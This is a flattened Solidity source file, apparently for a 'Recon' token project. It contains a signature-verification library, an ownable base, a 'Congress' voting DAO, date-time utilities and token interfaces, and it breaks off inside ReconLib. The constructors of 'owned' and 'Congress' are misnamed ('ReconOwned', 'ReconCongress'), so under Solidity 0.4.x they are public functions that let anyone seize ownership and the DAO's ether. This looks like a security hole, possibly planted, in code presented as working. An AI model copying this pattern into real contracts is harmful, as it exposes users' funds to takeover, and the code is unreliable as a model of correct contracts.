 

pragma solidity ^ 0.4.25;


 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 


pragma solidity ^ 0.4.25;


 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 


library ReconVerify {
     
    function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {
         
         
         
         
         

         
        bool ret;
        address addr;

        assembly {
            let size := mload(0x40)
            mstore(size, hash)
            mstore(add(size, 32), v)
            mstore(add(size, 64), r)
            mstore(add(size, 96), s)

             
             
            ret := call(3000, 1, 0, size, 128, size, 32)
            addr := mload(size)
        }

        return (ret, addr);
    }

    function ecrecovery(bytes32 hash, bytes sig) public returns (bool, address) {
        bytes32 r;
        bytes32 s;
        uint8 v;

        if (sig.length != 65)
          return (false, 0);

         
         
         
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))

             
             
             
            v := byte(0, mload(add(sig, 96)))

             
             
             
             
        }

         
         
         
         
         
        if (v < 27)
          v += 27;

        if (v != 27 && v != 28)
            return (false, 0);

        return safer_ecrecover(hash, v, r, s);
    }

    function verify(bytes32 hash, bytes sig, address signer) public returns (bool) {
        bool ret;
        address addr;
        (ret, addr) = ecrecovery(hash, sig);
        return ret == true && addr == signer;
    }

    function recover(bytes32 hash, bytes sig) internal returns (address addr) {
        bool ret;
        (ret, addr) = ecrecovery(hash, sig);
    }
}

contract ReconVerifyTest {
    function test_v0() public returns (bool) {
        bytes32 hash = 0x47173285a8d7341e5e972fc677286384f802f8ef42a5ec5f03bbfa254cb01fad;
        bytes memory sig = "\xac\xa7\xda\x99\x7a\xd1\x77\xf0\x40\x24\x0c\xdc\xcf\x69\x05\xb7\x1a\xb1\x6b\x74\x43\x43\x88\xc3\xa7\x2f\x34\xfd\x25\xd6\x43\x93\x46\xb2\xba\xc2\x74\xff\x29\xb4\x8b\x3e\xa6\xe2\xd0\x4c\x13\x36\xea\xce\xaf\xda\x3c\x53\xab\x48\x3f\xc3\xff\x12\xfa\xc3\xeb\xf2\x00";
        return ReconVerify.verify(hash, sig, 0x0A5f85C3d41892C934ae82BDbF17027A20717088);
    }

    function test_v1() public returns (bool) {
        bytes32 hash = 0x47173285a8d7341e5e972fc677286384f802f8ef42a5ec5f03bbfa254cb01fad;
        bytes memory sig = "\xde\xba\xaa\x0c\xdd\xb3\x21\xb2\xdc\xaa\xf8\x46\xd3\x96\x05\xde\x7b\x97\xe7\x7b\xa6\x10\x65\x87\x85\x5b\x91\x06\xcb\x10\x42\x15\x61\xa2\x2d\x94\xfa\x8b\x8a\x68\x7f\xf9\xc9\x11\xc8\x44\xd1\xc0\x16\xd1\xa6\x85\xa9\x16\x68\x58\xf9\xc7\xc1\xbc\x85\x12\x8a\xca\x01";
        return ReconVerify.verify(hash, sig, 0x0f65e64662281D6D42eE6dEcb87CDB98fEAf6060);
    }
}

 
 
 
 
 

pragma solidity ^ 0.4.25;

contract owned {
    address public owner;

    function ReconOwned()  public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner  public {
        owner = newOwner;
    }
}


contract tokenRecipient {
    event receivedEther(address sender, uint amount);
    event receivedTokens(address _from, uint256 _value, address _token, bytes _extraData);

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public {
        Token t = Token(_token);
        require(t.transferFrom(_from, this, _value));
        emit receivedTokens(_from, _value, _token, _extraData);
    }

    function () payable  public {
        emit receivedEther(msg.sender, msg.value);
    }
}


interface Token {
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
}


contract Congress is owned, tokenRecipient {
     
    uint public minimumQuorum;
    uint public debatingPeriodInMinutes;
    int public majorityMargin;
    Proposal[] public proposals;
    uint public numProposals;
    mapping (address => uint) public memberId;
    Member[] public members;

    event ProposalAdded(uint proposalID, address recipient, uint amount, string description);
    event Voted(uint proposalID, bool position, address voter, string justification);
    event ProposalTallied(uint proposalID, int result, uint quorum, bool active);
    event MembershipChanged(address member, bool isMember);
    event ChangeOfRules(uint newMinimumQuorum, uint newDebatingPeriodInMinutes, int newMajorityMargin);

    struct Proposal {
        address recipient;
        uint amount;
        string description;
        uint minExecutionDate;
        bool executed;
        bool proposalPassed;
        uint numberOfVotes;
        int currentResult;
        bytes32 proposalHash;
        Vote[] votes;
        mapping (address => bool) voted;
    }

    struct Member {
        address member;
        string name;
        uint memberSince;
    }

    struct Vote {
        bool inSupport;
        address voter;
        string justification;
    }

     
    modifier onlyMembers {
        require(memberId[msg.sender] != 0);
        _;
    }

     
    function ReconCongress (
        uint minimumQuorumForProposals,
        uint minutesForDebate,
        int marginOfVotesForMajority
    )  payable public {
        changeVotingRules(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority);
         
        addMember(0, "");
         
        addMember(owner, 'founder');
    }

     
    function addMember(address targetMember, string memberName) onlyOwner public {
        uint id = memberId[targetMember];
        if (id == 0) {
            memberId[targetMember] = members.length;
            id = members.length++;
        }

        members[id] = Member({member: targetMember, memberSince: now, name: memberName});
        emit MembershipChanged(targetMember, true);
    }

     
    function removeMember(address targetMember) onlyOwner public {
        require(memberId[targetMember] != 0);

        for (uint i = memberId[targetMember]; i<members.length-1; i++){
            members[i] = members[i+1];
        }
        delete members[members.length-1];
        members.length--;
    }

     
    function changeVotingRules(
        uint minimumQuorumForProposals,
        uint minutesForDebate,
        int marginOfVotesForMajority
    ) onlyOwner public {
        minimumQuorum = minimumQuorumForProposals;
        debatingPeriodInMinutes = minutesForDebate;
        majorityMargin = marginOfVotesForMajority;

        emit ChangeOfRules(minimumQuorum, debatingPeriodInMinutes, majorityMargin);
    }

     
    function newProposal(
        address beneficiary,
        uint weiAmount,
        string jobDescription,
        bytes transactionBytecode
    )
        onlyMembers public
        returns (uint proposalID)
    {
        proposalID = proposals.length++;
        Proposal storage p = proposals[proposalID];
        p.recipient = beneficiary;
        p.amount = weiAmount;
        p.description = jobDescription;
        p.proposalHash = keccak256(abi.encodePacked(beneficiary, weiAmount, transactionBytecode));
        p.minExecutionDate = now + debatingPeriodInMinutes * 1 minutes;
        p.executed = false;
        p.proposalPassed = false;
        p.numberOfVotes = 0;
        emit ProposalAdded(proposalID, beneficiary, weiAmount, jobDescription);
        numProposals = proposalID+1;

        return proposalID;
    }

     
    function newProposalInEther(
        address beneficiary,
        uint etherAmount,
        string jobDescription,
        bytes transactionBytecode
    )
        onlyMembers public
        returns (uint proposalID)
    {
        return newProposal(beneficiary, etherAmount * 1 ether, jobDescription, transactionBytecode);
    }

     
    function checkProposalCode(
        uint proposalNumber,
        address beneficiary,
        uint weiAmount,
        bytes transactionBytecode
    )
        constant public
        returns (bool codeChecksOut)
    {
        Proposal storage p = proposals[proposalNumber];
        return p.proposalHash == keccak256(abi.encodePacked(beneficiary, weiAmount, transactionBytecode));
    }

     
    function vote(
        uint proposalNumber,
        bool supportsProposal,
        string justificationText
    )
        onlyMembers public
        returns (uint voteID)
    {
        Proposal storage p = proposals[proposalNumber];  
        require(!p.voted[msg.sender]);                   
        p.voted[msg.sender] = true;                      
        p.numberOfVotes++;                               
        if (supportsProposal) {                          
            p.currentResult++;                           
        } else {                                         
            p.currentResult--;                           
        }

         
        emit Voted(proposalNumber,  supportsProposal, msg.sender, justificationText);
        return p.numberOfVotes;
    }

     
    function executeProposal(uint proposalNumber, bytes transactionBytecode) public {
        Proposal storage p = proposals[proposalNumber];

        require(now > p.minExecutionDate                                             
            && !p.executed                                                          
            && p.proposalHash == keccak256(abi.encodePacked(p.recipient, p.amount, transactionBytecode))   
            && p.numberOfVotes >= minimumQuorum);                                   

         

        if (p.currentResult > majorityMargin) {
             

            p.executed = true;  
            require(p.recipient.call.value(p.amount)(transactionBytecode));

            p.proposalPassed = true;
        } else {
             
            p.proposalPassed = false;
        }

         
        emit ProposalTallied(proposalNumber, p.currentResult, p.numberOfVotes, p.proposalPassed);
    }
}

 
 
 
 
 

pragma solidity ^ 0.4.25;

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }

    function sub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }

    function mul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }

    function div(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}


pragma solidity ^ 0.4.25;

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 


library ReconDateTimeLibrary {

    uint constant SECONDS_PER_DAY = 24 * 60 * 60;
    uint constant SECONDS_PER_HOUR = 60 * 60;
    uint constant SECONDS_PER_MINUTE = 60;
    int constant OFFSET19700101 = 2440588;

    uint constant DOW_MON = 1;
    uint constant DOW_TUE = 2;
    uint constant DOW_WED = 3;
    uint constant DOW_THU = 4;
    uint constant DOW_FRI = 5;
    uint constant DOW_SAT = 6;
    uint constant DOW_SUN = 7;

     
     
     
     
     
     
     
     
     
     
     
     
     
    function _daysFromDate(uint year, uint month, uint day) internal pure returns (uint _days) {
        int _year = int(year);
        int _month = int(month);
        int _day = int(day);

        int __days = _day
          - 32075
          + 1461 * (_year + 4800 + (_month - 14) / 12) / 4
          + 367 * (_month - 2 - (_month - 14) / 12 * 12) / 12
          - 3 * ((_year + 4900 + (_month - 14) / 12) / 100) / 4
          - OFFSET19700101;

        _days = uint(__days);
    }

     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
    function _daysToDate(uint _days) internal pure returns (uint year, uint month, uint day) {
        int __days = int(_days);

        int L = __days + 68569 + OFFSET19700101;
        int N = 4 * L / 146097;
        L = L - (146097 * N + 3) / 4;
        int _year = 4000 * (L + 1) / 1461001;
        L = L - 1461 * _year / 4 + 31;
        int _month = 80 * L / 2447;
        int _day = L - 2447 * _month / 80;
        L = _month / 11;
        _month = _month + 2 - 12 * L;
        _year = 100 * (N - 49) + _year + L;

        year = uint(_year);
        month = uint(_month);
        day = uint(_day);
    }

    function timestampFromDate(uint year, uint month, uint day) internal pure returns (uint timestamp) {
        timestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY;
    }

    function timestampFromDateTime(uint year, uint month, uint day, uint hour, uint minute, uint second) internal pure returns (uint timestamp) {
        timestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + hour * SECONDS_PER_HOUR + minute * SECONDS_PER_MINUTE + second;
    }

    function timestampToDate(uint timestamp) internal pure returns (uint year, uint month, uint day) {
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
    }

    function timestampToDateTime(uint timestamp) internal pure returns (uint year, uint month, uint day, uint hour, uint minute, uint second) {
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
        uint secs = timestamp % SECONDS_PER_DAY;
        hour = secs / SECONDS_PER_HOUR;
        secs = secs % SECONDS_PER_HOUR;
        minute = secs / SECONDS_PER_MINUTE;
        second = secs % SECONDS_PER_MINUTE;
    }

    function isLeapYear(uint timestamp) internal pure returns (bool leapYear) {
        uint year;
        uint month;
        uint day;
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
        leapYear = _isLeapYear(year);
    }

    function _isLeapYear(uint year) internal pure returns (bool leapYear) {
        leapYear = ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0);
    }

    function isWeekDay(uint timestamp) internal pure returns (bool weekDay) {
        weekDay = getDayOfWeek(timestamp) <= DOW_FRI;
    }

    function isWeekEnd(uint timestamp) internal pure returns (bool weekEnd) {
        weekEnd = getDayOfWeek(timestamp) >= DOW_SAT;
    }

    function getDaysInMonth(uint timestamp) internal pure returns (uint daysInMonth) {
        uint year;
        uint month;
        uint day;
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
        daysInMonth = _getDaysInMonth(year, month);
    }

    function _getDaysInMonth(uint year, uint month) internal pure returns (uint daysInMonth) {
        if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {
            daysInMonth = 31;
        } else if (month != 2) {
            daysInMonth = 30;
        } else {
            daysInMonth = _isLeapYear(year) ? 29 : 28;
        }
    }
     
    function getDayOfWeek(uint timestamp) internal pure returns (uint dayOfWeek) {
        uint _days = timestamp / SECONDS_PER_DAY;
        dayOfWeek = (_days + 3) % 7 + 1;
    }

    function getYear(uint timestamp) internal pure returns (uint year) {
        uint month;
        uint day;
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
    }

    function getMonth(uint timestamp) internal pure returns (uint month) {
        uint year;
        uint day;
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
    }

    function getDay(uint timestamp) internal pure returns (uint day) {
        uint year;
        uint month;
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
    }

    function getHour(uint timestamp) internal pure returns (uint hour) {
        uint secs = timestamp % SECONDS_PER_DAY;
        hour = secs / SECONDS_PER_HOUR;
    }

    function getMinute(uint timestamp) internal pure returns (uint minute) {
        uint secs = timestamp % SECONDS_PER_HOUR;
        minute = secs / SECONDS_PER_MINUTE;
    }

    function getSecond(uint timestamp) internal pure returns (uint second) {
        second = timestamp % SECONDS_PER_MINUTE;
    }

    function addYears(uint timestamp, uint _years) internal pure returns (uint newTimestamp) {
        uint year;
        uint month;
        uint day;
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
        year += _years;
        uint daysInMonth = _getDaysInMonth(year, month);
        if (day > daysInMonth) {
            day = daysInMonth;
        }
        newTimestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + timestamp % SECONDS_PER_DAY;
        require(newTimestamp >= timestamp);
    }

    function addMonths(uint timestamp, uint _months) internal pure returns (uint newTimestamp) {
        uint year;
        uint month;
        uint day;
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
        month += _months;
        year += (month - 1) / 12;
        month = (month - 1) % 12 + 1;
        uint daysInMonth = _getDaysInMonth(year, month);
        if (day > daysInMonth) {
            day = daysInMonth;
        }
        newTimestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + timestamp % SECONDS_PER_DAY;
        require(newTimestamp >= timestamp);
    }

    function addDays(uint timestamp, uint _days) internal pure returns (uint newTimestamp) {
        newTimestamp = timestamp + _days * SECONDS_PER_DAY;
        require(newTimestamp >= timestamp);
    }

    function addHours(uint timestamp, uint _hours) internal pure returns (uint newTimestamp) {
        newTimestamp = timestamp + _hours * SECONDS_PER_HOUR;
        require(newTimestamp >= timestamp);
    }

    function addMinutes(uint timestamp, uint _minutes) internal pure returns (uint newTimestamp) {
        newTimestamp = timestamp + _minutes * SECONDS_PER_MINUTE;
        require(newTimestamp >= timestamp);
    }

    function addSeconds(uint timestamp, uint _seconds) internal pure returns (uint newTimestamp) {
        newTimestamp = timestamp + _seconds;
        require(newTimestamp >= timestamp);
    }

    function subYears(uint timestamp, uint _years) internal pure returns (uint newTimestamp) {
        uint year;
        uint month;
        uint day;
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
        year -= _years;
        uint daysInMonth = _getDaysInMonth(year, month);
        if (day > daysInMonth) {
            day = daysInMonth;
        }
        newTimestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + timestamp % SECONDS_PER_DAY;
        require(newTimestamp <= timestamp);
    }

    function subMonths(uint timestamp, uint _months) internal pure returns (uint newTimestamp) {
        uint year;
        uint month;
        uint day;
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
        uint yearMonth = year * 12 + (month - 1) - _months;
        year = yearMonth / 12;
        month = yearMonth % 12 + 1;
        uint daysInMonth = _getDaysInMonth(year, month);
        if (day > daysInMonth) {
            day = daysInMonth;
        }
        newTimestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + timestamp % SECONDS_PER_DAY;
        require(newTimestamp <= timestamp);
    }

    function subDays(uint timestamp, uint _days) internal pure returns (uint newTimestamp) {
        newTimestamp = timestamp - _days * SECONDS_PER_DAY;
        require(newTimestamp <= timestamp);
    }

    function subHours(uint timestamp, uint _hours) internal pure returns (uint newTimestamp) {
        newTimestamp = timestamp - _hours * SECONDS_PER_HOUR;
        require(newTimestamp <= timestamp);
    }

    function subMinutes(uint timestamp, uint _minutes) internal pure returns (uint newTimestamp) {
        newTimestamp = timestamp - _minutes * SECONDS_PER_MINUTE;
        require(newTimestamp <= timestamp);
    }

    function subSeconds(uint timestamp, uint _seconds) internal pure returns (uint newTimestamp) {
        newTimestamp = timestamp - _seconds;
        require(newTimestamp <= timestamp);
    }

    function diffYears(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _years) {
        require(fromTimestamp <= toTimestamp);
        uint fromYear;
        uint fromMonth;
        uint fromDay;
        uint toYear;
        uint toMonth;
        uint toDay;
        (fromYear, fromMonth, fromDay) = _daysToDate(fromTimestamp / SECONDS_PER_DAY);
        (toYear, toMonth, toDay) = _daysToDate(toTimestamp / SECONDS_PER_DAY);
        _years = toYear - fromYear;
    }

    function diffMonths(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _months) {
        require(fromTimestamp <= toTimestamp);
        uint fromYear;
        uint fromMonth;
        uint fromDay;
        uint toYear;
        uint toMonth;
        uint toDay;
        (fromYear, fromMonth, fromDay) = _daysToDate(fromTimestamp / SECONDS_PER_DAY);
        (toYear, toMonth, toDay) = _daysToDate(toTimestamp / SECONDS_PER_DAY);
        _months = toYear * 12 + toMonth - fromYear * 12 - fromMonth;
    }

    function diffDays(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _days) {
        require(fromTimestamp <= toTimestamp);
        _days = (toTimestamp - fromTimestamp) / SECONDS_PER_DAY;
    }

    function diffHours(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _hours) {
        require(fromTimestamp <= toTimestamp);
        _hours = (toTimestamp - fromTimestamp) / SECONDS_PER_HOUR;
    }

    function diffMinutes(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _minutes) {
        require(fromTimestamp <= toTimestamp);
        _minutes = (toTimestamp - fromTimestamp) / SECONDS_PER_MINUTE;
    }

    function diffSeconds(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _seconds) {
        require(fromTimestamp <= toTimestamp);
        _seconds = toTimestamp - fromTimestamp;
    }
}


pragma solidity ^ 0.4.25;

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

contract ReconDateTimeContract {
    uint public constant SECONDS_PER_DAY = 24 * 60 * 60;
    uint public constant SECONDS_PER_HOUR = 60 * 60;
    uint public constant SECONDS_PER_MINUTE = 60;
    int public constant OFFSET19700101 = 2440588;

    uint public constant DOW_MON = 1;
    uint public constant DOW_TUE = 2;
    uint public constant DOW_WED = 3;
    uint public constant DOW_THU = 4;
    uint public constant DOW_FRI = 5;
    uint public constant DOW_SAT = 6;
    uint public constant DOW_SUN = 7;

    function _now() public view returns (uint timestamp) {
        timestamp = now;
    }

    function _nowDateTime() public view returns (uint year, uint month, uint day, uint hour, uint minute, uint second) {
        (year, month, day, hour, minute, second) = ReconDateTimeLibrary.timestampToDateTime(now);
    }

    function _daysFromDate(uint year, uint month, uint day) public pure returns (uint _days) {
        return ReconDateTimeLibrary._daysFromDate(year, month, day);
    }

    function _daysToDate(uint _days) public pure returns (uint year, uint month, uint day) {
        return ReconDateTimeLibrary._daysToDate(_days);
    }

    function timestampFromDate(uint year, uint month, uint day) public pure returns (uint timestamp) {
        return ReconDateTimeLibrary.timestampFromDate(year, month, day);
    }

    function timestampFromDateTime(uint year, uint month, uint day, uint hour, uint minute, uint second) public pure returns (uint timestamp) {
        return ReconDateTimeLibrary.timestampFromDateTime(year, month, day, hour, minute, second);
    }

    function timestampToDate(uint timestamp) public pure returns (uint year, uint month, uint day) {
        (year, month, day) = ReconDateTimeLibrary.timestampToDate(timestamp);
    }

    function timestampToDateTime(uint timestamp) public pure returns (uint year, uint month, uint day, uint hour, uint minute, uint second) {
        (year, month, day, hour, minute, second) = ReconDateTimeLibrary.timestampToDateTime(timestamp);
    }

    function isLeapYear(uint timestamp) public pure returns (bool leapYear) {
        leapYear = ReconDateTimeLibrary.isLeapYear(timestamp);
    }

    function _isLeapYear(uint year) public pure returns (bool leapYear) {
        leapYear = ReconDateTimeLibrary._isLeapYear(year);
    }

    function isWeekDay(uint timestamp) public pure returns (bool weekDay) {
        weekDay = ReconDateTimeLibrary.isWeekDay(timestamp);
    }

    function isWeekEnd(uint timestamp) public pure returns (bool weekEnd) {
        weekEnd = ReconDateTimeLibrary.isWeekEnd(timestamp);
    }

    function getDaysInMonth(uint timestamp) public pure returns (uint daysInMonth) {
        daysInMonth = ReconDateTimeLibrary.getDaysInMonth(timestamp);
    }

    function _getDaysInMonth(uint year, uint month) public pure returns (uint daysInMonth) {
        daysInMonth = ReconDateTimeLibrary._getDaysInMonth(year, month);
    }

    function getDayOfWeek(uint timestamp) public pure returns (uint dayOfWeek) {
        dayOfWeek = ReconDateTimeLibrary.getDayOfWeek(timestamp);
    }

    function getYear(uint timestamp) public pure returns (uint year) {
        year = ReconDateTimeLibrary.getYear(timestamp);
    }

    function getMonth(uint timestamp) public pure returns (uint month) {
        month = ReconDateTimeLibrary.getMonth(timestamp);
    }

    function getDay(uint timestamp) public pure returns (uint day) {
        day = ReconDateTimeLibrary.getDay(timestamp);
    }

    function getHour(uint timestamp) public pure returns (uint hour) {
        hour = ReconDateTimeLibrary.getHour(timestamp);
    }

    function getMinute(uint timestamp) public pure returns (uint minute) {
        minute = ReconDateTimeLibrary.getMinute(timestamp);
    }

    function getSecond(uint timestamp) public pure returns (uint second) {
        second = ReconDateTimeLibrary.getSecond(timestamp);
    }

    function addYears(uint timestamp, uint _years) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.addYears(timestamp, _years);
    }

    function addMonths(uint timestamp, uint _months) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.addMonths(timestamp, _months);
    }

    function addDays(uint timestamp, uint _days) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.addDays(timestamp, _days);
    }

    function addHours(uint timestamp, uint _hours) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.addHours(timestamp, _hours);
    }

    function addMinutes(uint timestamp, uint _minutes) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.addMinutes(timestamp, _minutes);
    }

    function addSeconds(uint timestamp, uint _seconds) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.addSeconds(timestamp, _seconds);
    }

    function subYears(uint timestamp, uint _years) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.subYears(timestamp, _years);
    }

    function subMonths(uint timestamp, uint _months) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.subMonths(timestamp, _months);
    }

    function subDays(uint timestamp, uint _days) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.subDays(timestamp, _days);
    }

    function subHours(uint timestamp, uint _hours) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.subHours(timestamp, _hours);
    }

    function subMinutes(uint timestamp, uint _minutes) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.subMinutes(timestamp, _minutes);
    }

    function subSeconds(uint timestamp, uint _seconds) public pure returns (uint newTimestamp) {
        newTimestamp = ReconDateTimeLibrary.subSeconds(timestamp, _seconds);
    }

    function diffYears(uint fromTimestamp, uint toTimestamp) public pure returns (uint _years) {
        _years = ReconDateTimeLibrary.diffYears(fromTimestamp, toTimestamp);
    }

    function diffMonths(uint fromTimestamp, uint toTimestamp) public pure returns (uint _months) {
        _months = ReconDateTimeLibrary.diffMonths(fromTimestamp, toTimestamp);
    }

    function diffDays(uint fromTimestamp, uint toTimestamp) public pure returns (uint _days) {
        _days = ReconDateTimeLibrary.diffDays(fromTimestamp, toTimestamp);
    }

    function diffHours(uint fromTimestamp, uint toTimestamp) public pure returns (uint _hours) {
        _hours = ReconDateTimeLibrary.diffHours(fromTimestamp, toTimestamp);
    }

    function diffMinutes(uint fromTimestamp, uint toTimestamp) public pure returns (uint _minutes) {
        _minutes = ReconDateTimeLibrary.diffMinutes(fromTimestamp, toTimestamp);
    }

    function diffSeconds(uint fromTimestamp, uint toTimestamp) public pure returns (uint _seconds) {
        _seconds = ReconDateTimeLibrary.diffSeconds(fromTimestamp, toTimestamp);
    }
}


 
 
 
 
 


pragma solidity ^ 0.4.25;

contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    }


contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes32 hash) public;
}


contract ReconTokenInterface is ERC20Interface {
    uint public constant reconVersion = 110;

    bytes public constant signingPrefix = "\x19Ethereum Signed Message:\n32";
    bytes4 public constant signedTransferSig = "\x75\x32\xea\xac";
    bytes4 public constant signedApproveSig = "\xe9\xaf\xa7\xa1";
    bytes4 public constant signedTransferFromSig = "\x34\x4b\xcc\x7d";
    bytes4 public constant signedApproveAndCallSig = "\xf1\x6f\x9b\x53";

    event OwnershipTransferred(address indexed from, address indexed to);
    event MinterUpdated(address from, address to);
    event Mint(address indexed tokenOwner, uint tokens, bool lockAccount);
    event MintingDisabled();
    event TransfersEnabled();
    event AccountUnlocked(address indexed tokenOwner);

    function approveAndCall(address spender, uint tokens, bytes32 hash) public returns (bool success);

     
     
     
    function signedTransferHash(address tokenOwner, address to, uint tokens, uint fee, uint nonce) public view returns (bytes32 hash);
    function signedTransferCheck(address tokenOwner, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (CheckResult result);
    function signedTransfer(address tokenOwner, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success);

    function signedApproveHash(address tokenOwner, address spender, uint tokens, uint fee, uint nonce) public view returns (bytes32 hash);
    function signedApproveCheck(address tokenOwner, address spender, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (CheckResult result);
    function signedApprove(address tokenOwner, address spender, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success);

    function signedTransferFromHash(address spender, address from, address to, uint tokens, uint fee, uint nonce) public view returns (bytes32 hash);
    function signedTransferFromCheck(address spender, address from, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (CheckResult result);
    function signedTransferFrom(address spender, address from, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success);

    function signedApproveAndCallHash(address tokenOwner, address spender, uint tokens, bytes32 _data, uint fee, uint nonce) public view returns (bytes32 hash);
    function signedApproveAndCallCheck(address tokenOwner, address spender, uint tokens, bytes32 _data, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (CheckResult result);
    function signedApproveAndCall(address tokenOwner, address spender, uint tokens, bytes32 _data, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success);

    function mint(address tokenOwner, uint tokens, bool lockAccount) public returns (bool success);
    function unlockAccount(address tokenOwner) public;
    function disableMinting() public;
    function enableTransfers() public;


    enum CheckResult {
        Success,                            
        NotTransferable,                    
        AccountLocked,                      
        SignerMismatch,                     
        InvalidNonce,                       
        InsufficientApprovedTokens,         
        InsufficientApprovedTokensForFees,  
        InsufficientTokens,                 
        InsufficientTokensForFees,          
        OverflowError                       
    }
}


 
 
 
 
 


pragma solidity ^ 0.4.25;

library ReconLib {
    struct Data {
        bool initialised;

         
        address owner;
        address newOwner;

         
        address minter;
        bool mintable;
        bool transferable;
        mapping(address => bool) accountLocked;

         
        string symbol;
        string name;
        uint8 decimals;
        uint totalSupply;
        mapping(address => uint) balances;
        mapping(address => mapping(address => uint)) allowed;
        mapping(address => uint) nextNonce;
    }


    uint public constant reconVersion = 110;
    bytes public constant signingPrefix = "\x19Ethereum Signed Message:\n32";
    bytes4 public constant signedTransferSig = "\x75\x32\xea\xac";
    bytes4 public constant signedApproveSig = "\xe9\xaf\xa7\xa1";
    bytes4 public constant signedTransferFromSig = "\x34\x4b\xcc\x7d";
    bytes4 public constant signedApproveAndCallSig = "\xf1\x6f\x9b\x53";


    event OwnershipTransferred(address indexed from, address indexed to);
    event MinterUpdated(address from, address to);
    event Mint(address indexed tokenOwner, uint tokens, bool lockAccount);
    event MintingDisabled();
    event TransfersEnabled();
    event AccountUnlocked(address indexed tokenOwner);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);


    function init(Data storage self, address owner, string symbol, string name, uint8 decimals, uint initialSupply, bool mintable, bool transferable) public {
        require(!self.initialised);
        self.initialised = true;
        self.owner = owner;
        self.symbol = symbol;
        self.name = name;
        self.decimals = decimals;
        if (initialSupply > 0) {
            self.balances[owner] = initialSupply;
            self.totalSupply = initialSupply;
            emit Mint(self.owner, initialSupply, false);
            emit Transfer(address(0), self.owner, initialSupply);
        }
        self.mintable = mintable;
        self.transferable = transferable;
    }

    function safeAdd(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }

